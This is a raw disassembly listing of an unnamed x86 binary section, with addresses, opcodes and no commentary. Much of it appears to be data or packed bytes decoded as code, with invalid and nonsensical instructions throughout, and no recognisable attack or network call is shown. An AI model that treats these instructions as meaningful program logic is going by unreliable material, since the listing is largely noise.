  41ce52:	mov    eax,0x18e902e0
  41ce57:	popa   
  41ce58:	call   0x0:0x0
  41ce5f:	add    BYTE PTR [eax],al
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [ecx+0x46],cl
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	push   esp
  41ce71:	(bad)  
  41ce72:	mov    dl,ch
  41ce74:	xchg   DWORD PTR [ebx+0xad0001],ebp
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	pop    esp
  41ce7d:	dec    ebx
  41ce7e:	aaa    
  41ce7f:	dec    edi
  41ce80:	or     ch,dl
  41ce82:	xor    al,0xa5
  41ce84:	or     al,0xe3
  41ce86:	and    eax,0x5010ec17
  41ce8b:	pop    ebp
  41ce8c:	xchg   edi,eax
  41ce8d:	jecxz  0x41ceb8
  41ce8f:	xor    bh,BYTE PTR [ecx-0x3]
  41ce92:	push   eax
  41ce93:	(bad)  
  41ce95:	cmc    
  41ce96:	dec    esp
  41ce97:	nop
  41ce98:	jmp    FWORD PTR [ebx-0xfe4dcf9]
  41ce9e:	inc    ebx
  41ce9f:	jne    0x41ce7e
  41cea1:	sbb    eax,0xbb1dce3b
  41cea6:	mov    ?,WORD PTR [ebp-0x3f]
  41cea9:	fisubr WORD PTR [eax+0x1a567f6e]
  41ceaf:	mov    ds:0xa8fdf264,al
  41ceb4:	push   ss
  41ceb5:	ds push edi
  41ceb7:	sbb    esp,DWORD PTR [eax]
  41ceb9:	stos   BYTE PTR es:[edi],al
  41ceba:	mov    BYTE PTR [ebp+0x34],bh
  41cebd:	int    0x5f
  41cebf:	mov    eax,0x1a12a0f6
  41cec4:	or     dl,dh
  41cec6:	outs   dx,BYTE PTR ds:[esi]
  41cec7:	inc    ecx
  41cec8:	loop   0x41ce50
  41ceca:	inc    esi
  41cecb:	mov    ch,0xdd
  41cecd:	jg     0x41ceaf
  41cecf:	cli    
  41ced0:	sub    edx,ebx
  41ced2:	fadd   st,st(0)
  41ced4:	or     BYTE PTR [esi],bl
  41ced6:	mov    eax,ds:0x6afa406b
  41cedb:	sub    al,al
  41cedd:	cli    
  41cede:	pop    ds
  41cedf:	retf   
  41cee0:	fimul  WORD PTR [edx]
  41cee2:	xchg   esp,eax
  41cee3:	adc    cl,BYTE PTR [eax+0x30041d82]
  41cee9:	out    0xcd,al
  41ceeb:	push   ecx
  41ceec:	gs call 0x1b4bb3e2
  41cef2:	cwde   
  41cef3:	jle    0x41cf06
  41cef5:	lods   al,BYTE PTR ds:[esi]
  41cef6:	scas   al,BYTE PTR es:[edi]
  41cef7:	cmp    DWORD PTR [ebx+0x27],eax
  41cefa:	jbe    0x41cf63
  41cefc:	cmp    dh,BYTE PTR [edx+edx*4+0xc]
  41cf00:	jge    0x41cf7f
  41cf02:	push   DWORD PTR [esi-0x4efb9ba4]
  41cf08:	inc    eax
  41cf09:	push   esi
  41cf0a:	in     eax,dx
  41cf0b:	inc    eax
  41cf0c:	adc    eax,ebp
  41cf0e:	push   edx
  41cf0f:	inc    eax
  41cf10:	mov    ah,0x18
  41cf12:	sahf   
  41cf13:	mov    ?,WORD PTR [eax]
  41cf15:	(bad)  
  41cf16:	out    0xf9,eax
  41cf18:	test   eax,0x8155c933
  41cf1d:	ror    ah,1
  41cf1f:	idiv   BYTE PTR [ecx-0x37]
  41cf22:	pop    ss
  41cf23:	pop    ecx
  41cf24:	test   DWORD PTR [ecx-0x3],esi
  41cf27:	xchg   esp,eax
  41cf28:	hlt    
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [edi-0x3a],ah
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0x3ff0da72
  41cf42:	mov    ebx,0x1ac34c0
  41cf47:	add    BYTE PTR [ebp-0x1000000],ch
  41cf4d:	jbe    0x41ced2
  41cf4f:	inc    esp
  41cf50:	loopne 0x41cf8a
  41cf52:	cld    
  41cf53:	leave  
  41cf54:	jno    0x41cf52
  41cf56:	sbb    ch,dl
  41cf58:	fmul   st,st(6)
  41cf5a:	lds    edx,FWORD PTR [ecx-0x4c]
  41cf5d:	jecxz  0x41cee7
  41cf5f:	test   DWORD PTR [esi-0x6d],0x9284a1cb
  41cf66:	imul   ebp,esp,0x6f
  41cf69:	jl     0x41cf52
  41cf6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf6c:	mov    edi,0x1182e83b
  41cf71:	daa    
  41cf72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf73:	mov    eax,ds:0x32bbab33
  41cf78:	in     al,dx
  41cf79:	mov    edi,DWORD PTR cs:[edi+0x6be7ed4a]
  41cf80:	adc    eax,0xd37d1936
  41cf85:	iret   
  41cf86:	les    eax,FWORD PTR [esi+0x47]
  41cf89:	and    DWORD PTR [eax],ebx
  41cf8b:	sahf   
  41cf8c:	pop    edx
  41cf8d:	outs   dx,DWORD PTR ds:[esi]
  41cf8e:	test   DWORD PTR [eax+0x7e35fc12],ebp
  41cf94:	or     edx,DWORD PTR [edx]
  41cf96:	add    al,0x7c
  41cf98:	aam    0x87
  41cf9a:	lahf   
  41cf9b:	fsub   QWORD PTR [edx-0x7]
  41cf9e:	jmp    0x6371:0x697b60b
  41cfa5:	clc    
  41cfa6:	xor    dl,BYTE PTR [eax-0x3351b551]
  41cfac:	dec    edx
  41cfad:	mov    ebx,0xec211ba7
  41cfb2:	xchg   edx,eax
  41cfb3:	push   esp
  41cfb4:	or     al,0x9d
  41cfb6:	sub    BYTE PTR [bp+si],bh
  41cfb9:	dec    DWORD PTR [eax+0x18620920]
  41cfbf:	xor    ebx,esi
  41cfc1:	iret   
  41cfc2:	push   edx
  41cfc3:	(bad)  
  41cfc4:	outs   dx,BYTE PTR ds:[esi]
  41cfc5:	add    DWORD PTR [eax-0x49],0x31a4398c
  41cfcc:	and    ebp,edi
  41cfce:	out    dx,al
  41cfcf:	and    BYTE PTR [ecx],cl
  41cfd1:	sub    edi,DWORD PTR [edx-0x22dbcc60]
  41cfd7:	dec    ecx
  41cfd8:	mov    ebx,0xa5d1498e
  41cfdd:	or     DWORD PTR [ecx-0x7a27f986],esi
  41cfe3:	xchg   esi,eax
  41cfe4:	pop    ds
  41cfe5:	mov    al,0xe8
  41cfe7:	test   BYTE PTR [eax-0x337a805a],bh
  41cfed:	lea    ebx,[edi]
  41cfef:	jo     0x41cf72
  41cff1:	scas   al,BYTE PTR es:[edi]
  41cff2:	jge    0x41d054
  41cff4:	xlat   BYTE PTR ds:[ebx]
  41cff5:	sbb    BYTE PTR [edx],dh
  41cff7:	push   cs
  41cff8:	sldt   WORD PTR [eax]
	...
  41d003:	add    bl,al
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x7f25e547,eax
  41d013:	daa    
  41d014:	loope  0x41cfc2
  41d016:	add    DWORD PTR [eax],eax
  41d018:	lods   eax,DWORD PTR ds:[esi]
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [esi],ch
  41d01d:	pop    ds
  41d01e:	sub    esi,DWORD PTR [ebp-0x33]
  41d021:	cld    
  41d022:	out    dx,al
  41d023:	push   ecx
  41d024:	fnstcw WORD PTR [ebx]
  41d026:	repz adc esp,DWORD PTR [edx-0x5d]
  41d02a:	imul   ebp,DWORD PTR [edx],0xffffff84
  41d02d:	or     DWORD PTR [ecx+ebp*8+0x45],edi
  41d031:	outs   dx,BYTE PTR ds:[si]
  41d033:	mov    eax,ds:0xa26a7187
  41d038:	mov    al,ds:0xc8f9cf48
  41d03d:	pop    ebp
  41d03e:	je     0x41cfdd
  41d040:	add    ecx,esi
  41d042:	push   esi
  41d043:	aam    0x53
  41d045:	mov    bl,0x42
  41d047:	sbb    eax,0x1f9281c8
  41d04c:	popf   
  41d04d:	mov    ebp,0x30d0c259
  41d052:	adc    dh,BYTE PTR [edi+ebp*8+0x3647ff5]
  41d059:	aas    
  41d05a:	and    eax,0x3a26e561
  41d05f:	adc    eax,0xb1009fa
  41d064:	sets   BYTE PTR [ecx+0x77]
  41d068:	push   ss
  41d069:	js     0x41d0b9
  41d06b:	and    eax,0x275e8e41
  41d070:	ins    BYTE PTR es:[edi],dx
  41d071:	ins    BYTE PTR es:[edi],dx
  41d072:	push   ebp
  41d073:	lock adc BYTE PTR [edi+0x6c],dl
  41d077:	pusha  
  41d078:	mul    BYTE PTR [eax-0x17]
  41d07b:	repz add ecx,DWORD PTR ds:0x2051a57e
  41d082:	push   ds
  41d083:	ds inc eax
  41d085:	jmp    0x41d043
  41d087:	jmp    0x41d0c3
  41d089:	lods   eax,DWORD PTR ds:[esi]
  41d08a:	clc    
  41d08b:	xlat   BYTE PTR ds:[ebx]
  41d08c:	aaa    
  41d08d:	mov    ebp,0x4182ea36
  41d092:	sub    al,0x6e
  41d094:	mov    edi,0xce39506c
  41d099:	scas   eax,DWORD PTR es:[edi]
  41d09a:	enter  0x23c3,0xc9
  41d09e:	shl    cl,0x15
  41d0a1:	ror    DWORD PTR [eax],1
  41d0a3:	adc    eax,0x94aa99e3
  41d0a8:	mov    DWORD PTR [esi+0x5f777b23],ecx
  41d0ae:	inc    ebx
  41d0af:	inc    esi
  41d0b0:	push   esi
  41d0b1:	or     dh,BYTE PTR ds:[ecx-0x566a83a6]
  41d0b8:	pusha  
  41d0b9:	lods   eax,DWORD PTR ds:[esi]
  41d0ba:	jecxz  0x41d139
  41d0bc:	int    0x27
  41d0be:	shr    BYTE PTR [ebp-0x59edf0e2],1
  41d0c4:	inc    eax
  41d0c5:	outs   dx,BYTE PTR ds:[esi]
  41d0c6:	inc    ebx
  41d0c7:	out    dx,eax
  41d0c8:	mov    edx,0x0
  41d0cd:	add    BYTE PTR [eax],al
  41d0cf:	add    BYTE PTR [eax],al
  41d0d1:	add    BYTE PTR [eax],al
  41d0d3:	add    cl,bl
  41d0d5:	ret    0x4905
  41d0d8:	pop    ds
  41d0d9:	iret   
  41d0da:	fst    st(2)
  41d0dc:	enter  0xf86f,0xd2
  41d0e0:	fwait
  41d0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0e2:	repnz pop ds
  41d0e4:	mov    gs,WORD PTR [ebp+0xad0001]
  41d0ea:	add    BYTE PTR [eax],al
  41d0ec:	mov    esi,DWORD PTR ds:0x62160a1f
  41d0f2:	mov    ebx,0x5da79fb6
  41d0f7:	test   eax,0xdf7f9589
  41d0fc:	int3   
  41d0fd:	jg     0x41d0d1
  41d0ff:	stos   BYTE PTR es:[edi],al
  41d100:	test   al,0xe3
  41d102:	daa    
  41d103:	in     eax,dx
  41d104:	adc    esi,DWORD PTR [eax-0x514293b6]
  41d10a:	jmp    0x41d0d7
  41d10c:	push   eax
  41d10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d10e:	mov    edi,0x34d5ab15
  41d113:	cmp    al,0x5e
  41d115:	aaa    
  41d116:	sub    DWORD PTR [eax],edx
  41d118:	imul   edi,DWORD PTR [edi+0x25827796],0x318b3ddd
  41d122:	ins    BYTE PTR es:[edi],dx
  41d123:	idiv   esi
  41d125:	sub    edi,DWORD PTR [ecx+0xdb634d4]
  41d12b:	pop    es
  41d12c:	pop    ss
  41d12d:	xor    bl,BYTE PTR [esp+edx*4-0x50]
  41d131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d132:	(bad)  
  41d133:	dec    eax
  41d134:	or     dl,BYTE PTR [ebp+0x7b]
  41d137:	xor    BYTE PTR [edi-0x21],bh
  41d13a:	push   es
  41d13b:	sbb    DWORD PTR [edx],esi
  41d13d:	rol    DWORD PTR [edi+edi*4+0x60],1
  41d141:	inc    ebx
  41d142:	aad    0xf0
  41d144:	pop    edi
  41d145:	or     edi,ebp
  41d147:	mov    dh,0x70
  41d149:	and    al,0xba
  41d14b:	and    eax,0x62034735
  41d150:	dec    ebx
  41d151:	out    dx,al
  41d152:	pop    ss
  41d153:	sub    al,0xd5
  41d155:	xor    eax,0x3cfd5a16
  41d15a:	cmp    al,0x75
  41d15c:	outs   dx,BYTE PTR ds:[esi]
  41d15d:	add    eax,0xa4cb5998
  41d162:	sub    dl,BYTE PTR [ecx+0x42]
  41d165:	hlt    
  41d166:	lods   eax,DWORD PTR ds:[esi]
  41d167:	jae    0x41d1cb
  41d169:	cld    
  41d16a:	jle    0x41d14c
  41d16c:	pop    ecx
  41d16d:	jg     0x41d1ab
  41d16f:	jle    0x41d1e3
  41d171:	mov    ebp,0x817afefb
  41d176:	sbb    dl,BYTE PTR [ebx]
  41d178:	jno    0x41d1b3
  41d17a:	inc    esp
  41d17b:	(bad)  
  41d17c:	fcmovb st,st(7)
  41d17e:	div    DWORD PTR [ecx]
  41d180:	mov    esp,0x3a5874b5
  41d185:	out    0x57,eax
  41d187:	mov    esi,0x8ddac9e9
  41d18c:	dec    esp
  41d18d:	sbb    eax,0xcec002b9
  41d192:	cmp    edi,ebx
  41d194:	ror    DWORD PTR [ebx-0x79],cl
  41d197:	in     eax,0x87
	...
  41d1a1:	add    BYTE PTR [eax],al
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	adc    bl,dh
  41d1b2:	push   0xffffff99
  41d1b4:	cmp    ebp,DWORD PTR [esi+0xc0001]
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	fs push ecx
  41d1be:	rcr    DWORD PTR [edx],1
  41d1c0:	mov    ch,0x91
  41d1c2:	cmc    
  41d1c3:	or     al,0x48
  41d1c5:	aad    0xd4
  41d1c7:	pop    es
	...
  41d1d4:	add    BYTE PTR [eax+0x42],ah
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
